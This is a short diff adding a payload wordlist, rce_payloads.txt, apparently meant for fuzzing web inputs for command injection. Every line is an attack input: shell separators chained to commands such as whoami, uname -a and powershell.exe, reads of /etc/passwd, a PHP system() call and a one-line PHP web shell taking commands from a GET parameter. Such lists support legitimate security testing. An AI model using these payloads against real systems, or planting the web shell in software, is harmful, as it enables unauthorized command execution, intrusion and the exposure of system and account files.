@@ -1,0 +1,11 @@
+# rce_payloads.txt
+; ls -la
+| whoami
+&& cat /etc/passwd
+| dir
+| powershell.exe
+; uname -a
+"; system('ls -la');"
+"<?php system($_GET['cmd']); ?>"
+"$(ls -la)"
+"$(cat /etc/passwd)"
